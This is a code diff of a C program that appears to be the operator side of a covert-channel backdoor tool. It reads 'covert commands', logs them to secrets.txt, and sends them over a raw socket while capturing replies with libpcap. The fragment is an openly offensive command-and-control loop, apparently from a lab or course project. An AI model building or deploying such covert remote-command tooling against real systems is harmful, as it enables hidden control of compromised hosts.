@@ -34,7 +34,7 @@ int main (int argc, char **argv)
     char temp[BUFLEN];
     int arg, opt, bytes_read, nbytes = BUFLEN;
     bpf_u_int32 maskp;          // subnet mask
-    char *test;
+    FILE *output;
 
     memset(errbuf,0,PCAP_ERRBUF_SIZE);
 
@@ -123,27 +123,36 @@ int main (int argc, char **argv)
     if (setsockopt (Addr_Ptr->RawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
         perror("setsockopt");
 
+
     while(1) {
-        printf("\nPlease enter a covert command (or type quit): ");
-        //scanf("%s", Addr_Ptr->cmd);
+        printf("\nPlease enter a covert command (or type \"quit\"): \n");
+
         bytes_read = getline(&Addr_Ptr->cmd, &nbytes, stdin);
+        Addr_Ptr->cmd[strlen(Addr_Ptr->cmd) - 1] = '\0';
         if(bytes_read == -1)
         {
             printf("%s", "Error!");
         }
+
+        if(strcmp(Addr_Ptr->cmd, "quit") == 0)
+        {
+            break;
+        }
         else
         {
-            printf("You typed: %s", Addr_Ptr->cmd);
+            output = fopen("secrets.txt", "a");
+            fprintf(output, "Command: %s\n", Addr_Ptr->cmd);
+            fflush(output);
+            fclose(output);
+            send_packet(Addr_Ptr);
+            receive_packet(pcap_ptr);
         }
-        if(strcmp(Addr_Ptr->cmd, "quit") == 0)
-            break;
-        send_packet(Addr_Ptr);
-        receive_packet(pcap_ptr);
     }
 
     free (Addr_Ptr);
     pcap_close(pcap_ptr->nic_descr );
     free (pcap_ptr);
+
 
     return 0;
 }
